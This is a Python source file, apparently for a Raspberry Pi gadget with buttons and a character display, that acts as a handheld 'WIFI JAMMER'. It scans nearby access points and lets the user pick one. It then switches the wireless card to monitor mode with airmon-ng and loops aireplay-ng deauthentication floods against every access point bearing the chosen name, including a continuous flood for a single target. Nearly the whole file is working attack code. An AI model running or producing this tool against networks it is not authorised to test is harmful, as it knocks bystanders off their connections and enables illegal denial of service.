import wifiscan
import subprocess
import RPi.GPIO as GPIO
import time

class Network_jammer(object):
	def __init__(self, interface, main):
		self.interface = interface
		self.main = main
		self.targetName = ""
		self.selection = 0
		self.results = []
		self.targetAPs = []
		self.wifimenu = self.main.addMenu("   WIFI JAMMER  ","Press to config.", self.startMenuSelected)
		
	def scan(self):
		self.results = wifiscan.scan(self.interface)
		self.main.displayMsg("     AP SCAN   ", "  Please Wait.  ")
		for network in self.results:
			print network

	def startMenuSelected(self):
		self.scan()
		self.apSelectDisplay()

		currentPresses = self.main.selectionPresses
		while True:
			while (self.main.selectionPresses == currentPresses) and (GPIO.input(22) == 1):
				time.sleep(0.1)
			if self.main.selectionPresses == currentPresses:
				break
			else:
				currentPresses = self.main.selectionPresses
				self.selection += 1
				self.selection = self.selection % len(self.results)
				self.apSelectDisplay()
		self.main.displayMsg("    AP SELECT  ", "C: "+self.results[self.selection]["Name"])
		time.sleep(1)
		self.setup()
		self.start()
				
	def apSelectDisplay(self):
		if len(self.results) == 0:
			self.main.displayMsg("    AP SELECT  ", " None in range. ")
		else:
			self.selection = self.selection % len(self.results)
			self.main.displayMsg("    AP SELECT  ", "C: "+self.results[self.selection]["Name"])


	def setup(self):
		time.sleep(0.5)
		subprocess.check_output(["/usr/local/sbin/airmon-ng", "check", "kill", self.interface])
		time.sleep(0.5)
		subprocess.check_output(["ifconfig", self.interface, "down"])
		time.sleep(1)
		subprocess.check_output(["/usr/local/sbin/airmon-ng", "check", "kill", self.interface])
		time.sleep(0.5)
		subprocess.check_output(["/usr/local/sbin/airmon-ng", "start", self.interface])
		time.sleep(2)
		subprocess.check_output(["/usr/local/sbin/airmon-ng", "check", "kill", self.interface])
		time.sleep(0.5)
		self.targetName = self.results[self.selection]["Name"]
		for network in self.results:
			if network["Name"] == self.targetName:
				self.targetAPs.append(network)
	
	def start(self):
		if len(self.targetAPs) > 1:
			while True:
				for network in self.targetAPs:
					self.main.displayMsg("WIFI JAMMER C:"+network["Channel"], network["Address"])
					subprocess.check_output(["iwconfig", self.interface, "channel", network["Channel"]])
					time.sleep(0.2)
					subprocess.check_output(["/usr/local/sbin/aireplay-ng", "-0", "6", "-a", network["Address"], "mon0"])
					time.sleep(0.2)
		else:
			self.main.displayMsg("  WIFI JAMMER  ", "C: "+self.targetAPs[0]["Name"])
			subprocess.check_output(["iwconfig", self.interface, "channel", self.targetAPs[0]["Channel"]])
			time.sleep(0.2)
			subprocess.check_output(["/usr/local/sbin/aireplay-ng", "-0", "0", "-a", self.targetAPs[0]["Address"], "mon0"])
			
